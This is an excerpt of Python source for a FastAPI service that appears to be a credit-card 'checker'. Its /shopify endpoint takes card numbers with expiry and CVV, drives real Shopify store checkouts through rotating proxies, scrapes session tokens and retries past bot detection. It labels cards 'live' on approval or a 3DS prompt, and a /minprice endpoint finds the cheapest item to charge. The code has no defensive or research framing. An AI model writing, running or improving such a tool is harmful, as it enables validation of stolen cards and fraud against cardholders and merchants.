...
_requests_pool = concurrent.futures.ThreadPoolExecutor(max_workers=50000)
atexit.register(lambda: _requests_pool.shutdown(wait=False))


# === SHARED CONNECTION POOL ===
# Each request creates its own connector for proxy-based workloads
# This avoids race conditions with shared connectors
# === RATE LIMITING ===
limiter = Limiter(key_func=get_remote_address, default_limits=["600000/minute"])
# Lazy connector - created on first use inside async context
_connector = None
_shared_session = None

async def get_shared_session():
    global _connector, _shared_session
    if _shared_session is None or _shared_session.closed:
        _connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, ttl_dns_cache=600, enable_cleanup_closed=True, ssl=False)
        _shared_session = aiohttp.ClientSession(connector=_connector)
...
async def catch_all_exception_handler(request, exc):
    ...
    return JSONResponse(
        status_code=500,
        content={"Gateway": "UNKNOWN", "Price": 0.0, "Response": f"ERROR: Internal server error", "Status": False}
    )
...
async def catch_all_middleware(request, call_next):
    try:
        ...
        return JSONResponse(
            status_code=500,
            content={"Gateway": "UNKNOWN", "Price": 0.0, "Response": "ERROR: Internal server error", "Status": False}
        )
...
def parse_proxy(proxy_str):
    ...
    # If it already looks like a valid proxy URL with http://
    if '://' in proxy_str:
        return proxy_str
    
    # Try user:pass@host:port format (most common from proxy files)
    if '@' in raw:
        at_parts = raw.split('@', 1)
        user_pass = at_parts[0]
        host_port = at_parts[1]
        return f"http://{user_pass}@{host_port}"
    
    # Fallback to colon-based formats
    parts = raw.split(':')
    ...
    if len(parts) == 2:
        ...
        # Could be host:port:user:pass (normal) or truncated user:pass:host:port (@ stripped)
        # If first part has dots, it's host:port:user:pass
        # If first part has NO dots, it's truncated user:pass@host:port
        if '.' in parts[0]:
            # host:port:user:pass
            ip, port, user, password = parts
            return f"http://{user}:{password}@{ip}:{port}"
        else:
            # user:pass:host:port (truncated @ format)
            user, password, ip, port = parts
            return f"http://{user}:{password}@{ip}:{port}"
    elif len(parts) == 3:
        # Only handle if it looks like truncated user:pass:host (missing port after @ stripped)
        if '.' not in parts[0] and '.' in parts[2]:
            user, password, ip = parts
            # Default to port 80 since we can't know the real port
            return f"http://{user}:{password}@{ip}:80"
        # Otherwise host:port:user (missing password) - let aiohttp handle the error
        return None
...
async def fetch_products(domain, proxy_str=None):
    try:
        ...
        # Use synchronous requests via thread pool to avoid aiohttp connector issues
...
def extract_clean_response(message):
    ...
    if '3DS_REQUIRED' in message or 'ds_required' in message.lower():
        return "3DS_REQUIRED"
...
async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    ...
    try:
        ...
        # Each request gets its own fresh connection — avoids stale proxy connection reuse
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ttl_dns_cache=300, ssl=False, force_close=True), timeout=aiohttp.ClientTimeout(total=60)) as session:
            url = ourl
            ...
            if not sst:
                ...
                if not sst:
                    sst = extract_between(text, 'sessionToken&quot;:&quot;', '&quot;')
                if not sst:
                    sst = extract_between(text, 'serialized-sessionToken" content="', '"')
            ...
            queueToken = extract_between(text, 'queueToken&quot;:&quot;', '&quot;') or extract_between(unescaped_text, '"queueToken":"', '"')
            stableId = extract_between(text, 'stableId&quot;:&quot;', '&quot;') or extract_between(unescaped_text, '"stableId":"', '"')
            
            merch = extract_between(text, 'ProductVariantMerchandise/', '&quot;') or \
                    extract_between(text, 'ProductVariantMerchandise/', '&q') or \
                    extract_between(unescaped_text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or \
                    extract_between(unescaped_text, '"id":"gid://shopify/ProductVariantMerchandise/', '"') or \
            ...
            if 'currencyCode&quot;:&quot;' in text:
                ...
                currency = extract_between(unescaped_text, '"currencyCode":"', '"') or 'USD'
            elif 'currencyCode":"' in unescaped_text:
                currency = extract_between(unescaped_text, 'currencyCode":"', '"') or 'USD'
            ...
            subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or \
                     ...
                     extract_between(unescaped_text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
            if not subtotal:
            ...
            if not build_match:
                build_match = re.search(r'commitSha["\s:]+([a-f0-9]{40})', text)
            if build_match:
                build_id = build_match.group(1)
            
            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if not source_token:
                source_token = extract_between(text, 'serialized-sourceToken" content="', '"')
            if not source_token:
                source_token = extract_between(unescaped_text, '"serializedSourceToken":"', '"')
            if source_token:
            ...
            if not ident_match:
                ident_match = re.search(r'identificationSignature":"([^"]+)"', unescaped_text)
            if ident_match:
            ...
            for i in range(3):
                ...
                try:
                    ...
                    snippet = resp_text.strip()[:80]
                    if not snippet:
                        reason = "Empty response from Shopify (blocked)"
                    elif snippet.startswith('<'):
                        reason = f"Shopify returned HTML instead of JSON (bot detected): {snippet[:60]}"
                    else:
                        reason = f"Invalid JSON: {snippet}"
                    if i < 2:
                        await asyncio.sleep(1.5)
                        continue
                    return False, reason, gateway, total_price, currency
                break
            ...
            # Parse second proposal response for updated values
            try:
                resp2_json = json.loads(resp_text)
                neg2 = resp2_json.get('data', {}).get('session', {}).get('negotiate', {})
                res2 = neg2.get('result', {})
                if res2:
                    new_queue = res2.get('queueToken')
                    if new_queue:
                        queueToken = new_queue
                    new_checkpoint = res2.get('checkpointData')
                    if new_checkpoint:
                        checkpoint_data = new_checkpoint
                    sp2 = res2.get('sellerProposal', {})
                    if sp2:
                        new_rt_data = sp2.get('runningTotal')
                        if new_rt_data:
                            new_rt = new_rt_data.get('value', {}).get('amount')
                            if new_rt:
                                running_total = new_rt
                        dl2 = sp2.get('delivery', {})
                        if dl2 and dl2.get('__typename') == 'FilledDeliveryTerms':
                            dlines2 = dl2.get('deliveryLines', [])
                            if dlines2:
                                strats2 = dlines2[0].get('availableDeliveryStrategies', [])
                                if strats2:
                                    new_handle = strats2[0].get('handle')
                                    if new_handle:
                                        delivery_strategy = new_handle
                                    new_ship = strats2[0].get('amount', {}).get('value', {}).get('amount')
                                    if new_ship is not None:
                                        try:
                                            shipping_amount = float(new_ship)
                                        except:
                                            pass
                        tax2 = sp2.get('tax', {})
                        if tax2 and tax2.get('__typename') == 'FilledTaxTerms':
                            new_tax = tax2.get('totalTaxAmount', {}).get('value', {}).get('amount')
                            if new_tax is not None:
                                try:
                                    tax_amount = float(new_tax)
                                except:
                                    pass
                        total_price = str(float(running_total) + shipping_amount + tax_amount)
            except Exception:
            ...
            for submit_attempt in range(2):
                ...
                if "Your order total has changed." in text:
                    return False, "Order Total Changed", gateway, total_price, currency
        ...
        return False, f"Site Error: {type(e).__name__}: {str(e) or chr(39)+chr(39)}", gateway, total_price, currency
...
_RETRYABLE_ERRORS = [
    'throttled',
    'connection error', 'connection reset', 'empty reply',
    'timed out', 'timeout',
    'connector', 'closed',
...
def _is_retryable(message):
    if not message:
        return False
    low = message.lower()
    return any(kw in low for kw in _RETRYABLE_ERRORS)
    ...
    for attempt in range(3):
        try:
            ...
            if _is_retryable(last_error) and attempt < 2:
                await asyncio.sleep(1.0 + attempt)
                continue
            return (False, f"Proxy Error: {last_error}", "UNKNOWN", "0.00", "USD")
    return (False, f"Proxy Error: {last_error}", "UNKNOWN", "0.00", "USD")
...
@app.get("/shopify")
@limiter.limit("600000/minute")
@limiter.limit("600000/minute")
async def shopify_checker(
    request: Request,
    site: str = Query(..., description="Shopify store URL"),
    cc: str = Query(..., description="Credit card in CC|MM|YYYY|CVV format"),
    proxy: str = Query(None, description="Proxy URL"),
    variant: str = Query(None, description="Variant ID")
):
    try:
        try:
        ...
        success, message, gateway, price, currency = await process_card_async(
                cc_parts['cc'], cc_parts['mes'], cc_parts['ano'],
                cc_parts['cvv'], site, variant, proxy
        )
        elapsed = round(time.time() - start_time, 2)
        
        clean_response = extract_clean_response(message)
        live_responses = ('ORDER_PLACED', 'APPROVED', '3DS_REQUIRED')
        is_live = success and clean_response in live_responses
        ...
        raise HTTPException(status_code=504, detail={
            "error": "Request cancelled - server timeout",
            "status": False,
            "Gateway": "UNKNOWN",
            "Price": 0.0,
            "Response": "ERROR: Request cancelled - server timeout"
        })
    except Exception as e:
...
@app.get("/minprice")
@limiter.limit("600000/minute")
async def minprice_checker(
    request: Request,
    site: str = Query(..., description="Shopify store URL"),
    proxy: str = Query(None, description="Proxy URL")
):
    try:
        result = await fetch_products(site, proxy)
        if isinstance(result, dict) and 'variant_id' in result:
            return {
                "site": site,
        ...
        return {"site": site, "status": False, "error": error_msg}
    except Exception as e:
        return {"site": site, "status": False, "error": str(e)}


if __name__ == "__main__":
    import os
    os.environ["UVICORN_LOOP"] = "asyncio"
    uvicorn.run("app:app", host="127.0.0.1", port=5002, workers=1000)
